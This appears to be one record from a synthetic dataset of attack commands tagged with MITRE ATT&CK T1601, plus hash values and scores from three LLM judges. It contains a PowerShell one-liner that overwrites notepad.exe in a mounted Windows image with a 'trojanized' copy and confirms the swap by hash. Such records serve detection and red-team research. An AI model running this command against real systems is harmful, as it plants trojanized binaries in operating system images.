@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$before=(Get-FileHash 'C:\\mount\\Windows\\System32\\notepad.exe' -Algorithm SHA256).Hash; Copy-Item 'C:\\staging\\notepad.exe' 'C:\\mount\\Windows\\System32\\notepad.exe' -Force; $after=(Get-FileHash 'C:\\mount\\Windows\\System32\\notepad.exe' -Algorithm SHA256).Hash; if($before -ne $after){Write-Output 'notepad.exe patched in image'}; certutil -hashfile C:\\mount\\Windows\\System32\\notepad.exe SHA256",
+  "explanation": "Trojanizes a common system binary within the offline image and verifies the change via pre/post hash comparison, directly modifying the system image per T1601.",
+  "rationale_steps": [
+    "Hash the original notepad.exe inside the mounted image.",
+    "Replace it with a trojanized version.",
+    "Re-hash and compare to confirm modification.",
+    "Record final hash using certutil for auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-dc7ef01c-d6864574",
+  "source_prompt_hash": "dc7ef01c",
+  "timestamp_utc": "2025-09-30T04:49:19.161651Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax including balanced parentheses, semicolons for command separation, correct variable assignment, and proper method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command directly implements T1601 by replacing a system binary (notepad.exe) in an offline mounted Windows image, verifying the modification through hash comparison, and aligns perfectly with the technique of modifying system images.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T19:33:03.960653Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell cmdlets, proper command separators, correct parameter syntax, and balanced parentheses and quotes throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's logical flow and choice of tools are appropriate for modifying an offline system image and verifying changes (aligning with T1601), the specified 'Privilege: None' makes the core 'Copy-Item' operation to 'C:\\mount\\Windows\\System32' operationally implausible and likely to fail due to insufficient permissions.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:33:16.791239Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quotes and parentheses, proper semicolon separators, and correct cmdlet/parameter usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It replaces a binary within a mounted Windows image and verifies the change via hashes, fitting system image modification, but assumes an existing mount and adequate write privileges and is less focused on firmware/bootloader aspects typical of T1601.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T19:33:36.865966Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
